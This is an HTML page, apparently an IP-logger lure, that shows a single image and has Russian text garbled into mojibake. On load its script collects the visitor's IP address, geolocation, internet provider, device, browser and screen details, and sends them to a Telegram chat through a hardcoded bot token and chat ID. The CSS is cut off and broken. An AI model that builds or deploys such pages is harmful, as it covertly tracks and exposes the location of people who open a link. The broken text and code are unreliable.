<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏–æ–Ω–Ω—ã–π —Ä–µ—Å—É—Ä—Å</title>
    <style>
        body {
            margin: 0;

            justify-content: center;

</head>
<body>
    <img class="main-image" src="https://i.pinimg.com/564x/a2/36/20/a23620bbf4143ab4b90a462e59c25dad.jpg" alt="–û—Å–Ω–æ–≤–Ω–æ–µ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ">

    <div class="info-panel hidden" id="infoPanel">
        <h3>–¢–µ—Ö–Ω–∏—á–µ—Å–∫–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è</h3>
        <div id="userData"></div>
    </div>

    <script>
        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –¥–∞–Ω–Ω—ã—Ö –≤ Telegram
        async function sendToTelegram(message) {
            const botToken = '6818081299:AAGEDkvcZltkYKPELkGv8AuvRxpBzqMQLu8';
                const chatId = '1209403544';
            
            try {
                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
                const data = await response.json();
                console.log('–°–æ–æ–±—â–µ–Ω–∏–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ:', data);
            } catch (error) {
                console.error('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏:', error);
            }
        }

        // –°–±–æ—Ä –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ
        function collectUserData() {
            const data = {
                "üìÖ –î–∞—Ç–∞ –∏ –≤—Ä–µ–º—è": new Date().toLocaleString('ru-RU'),
                "üåê IP-–∞–¥—Ä–µ—Å": "–û–ø—Ä–µ–¥–µ–ª—è–µ—Ç—Å—è...",
                "üñ•Ô∏è –£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ": navigator.platform,
                "üîç –ë—Ä–∞—É–∑–µ—Ä": navigator.userAgent,
                "üñåÔ∏è –†–∞–∑—Ä–µ—à–µ–Ω–∏–µ —ç–∫—Ä–∞–Ω–∞": `${screen.width}x${screen.height}`,
                "üé® –ì–ª—É–±–∏–Ω–∞ —Ü–≤–µ—Ç–∞": `${screen.colorDepth} –±–∏—Ç`,
                "üì± –ú–æ–±–∏–ª—å–Ω–æ–µ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ": /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ? "–î–∞" : "–ù–µ—Ç",
                "üåç –Ø–∑—ã–∫ –±—Ä–∞—É–∑–µ—Ä–∞": navigator.language,
                "üì∂ –û–Ω–ª–∞–π–Ω —Å—Ç–∞—Ç—É—Å": navigator.onLine ? "–û–Ω–ª–∞–π–Ω" : "–û—Ñ—Ñ–ª–∞–π–Ω",
                "üß≠ –ì–µ–æ–ª–æ–∫–∞—Ü–∏—è": "–û–ø—Ä–µ–¥–µ–ª—è–µ—Ç—Å—è...",
                "‚è±Ô∏è –ß–∞—Å–æ–≤–æ–π –ø–æ—è—Å": Intl.DateTimeFormat().resolvedOptions().timeZone,
                "üîã –£—Ä–æ–≤–µ–Ω—å –∑–∞—Ä—è–¥–∞": navigator.getBattery ? "–î–æ—Å—Ç—É–ø–Ω–æ" : "–ù–µ–¥–æ—Å—Ç—É–ø–Ω–æ",
                "üõ°Ô∏è Cookie –≤–∫–ª—é—á–µ–Ω—ã": navigator.cookieEnabled ? "–î–∞" : "–ù–µ—Ç",
                "üíæ –õ–æ–∫–∞–ª—å–Ω–æ–µ —Ö—Ä–∞–Ω–∏–ª–∏—â–µ": typeof localStorage !== 'undefined' ? "–î–æ—Å—Ç—É–ø–Ω–æ" : "–ù–µ–¥–æ—Å—Ç—É–ø–Ω–æ"
            };

            // –ü–æ–ª—É—á–∞–µ–º IP –∏ –≥–µ–æ–ª–æ–∫–∞—Ü–∏—é
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(ipData => {
                    data["üåê IP-–∞–¥—Ä–µ—Å"] = ipData.ip;
                    
                    return fetch(`https://ipapi.co/${ipData.ip}/json/`);
                })
                .then(response => response.json())
                .then(geoData => {
                    data["üß≠ –ì–µ–æ–ª–æ–∫–∞—Ü–∏—è"] = `${geoData.city || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'}, ${geoData.region || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'}, ${geoData.country_name || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'}`;
                    data["üè¢ –ü—Ä–æ–≤–∞–π–¥–µ—Ä"] = geoData.org || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ';
                    
                    // –û—Ç–æ–±—Ä–∞–∂–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é
                    displayUserData(data);
                    
                    // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –≤ Telegram
                    let telegramMessage = "üîî –ù–æ–≤—ã–π –ø–æ—Å–µ—Ç–∏—Ç–µ–ª—å:\n";
                    for (const [key, value] of Object.entries(data)) {
                        telegramMessage += `${key}: ${value}\n`;
                    }
                    sendToTelegram(telegramMessage);
                })
                .catch(error => {
                    console.error('–û—à–∏–±–∫–∞:', error);
                    data["üåê IP-–∞–¥—Ä–µ—Å"] = "–ù–µ —É–¥–∞–ª–æ—Å—å –æ–ø—Ä–µ–¥–µ–ª–∏—Ç—å";
                    displayUserData(data);
                });

            return data;
        }

        // –û—Ç–æ–±—Ä–∞–∂–µ–Ω–∏–µ —Å–æ–±—Ä–∞–Ω–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö
        function displayUserData(data) {
            const infoPanel = document.getElementById('infoPanel');
            const userDataDiv = document.getElementById('userData');
            
            let html = '';
            for (const [key, value] of Object.entries(data)) {
                html += `<p><strong>${key}:</strong> ${value}</p>`;
            }
            
            userDataDiv.innerHTML = html;
            infoPanel.classList.remove('hidden');
        }

        // –ó–∞–ø—É—Å–∫–∞–µ–º —Å–±–æ—Ä –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
        window.addEventListener('load', () => {
            setTimeout(collectUserData, 1000);
        });
    </script>
</body>
</html>
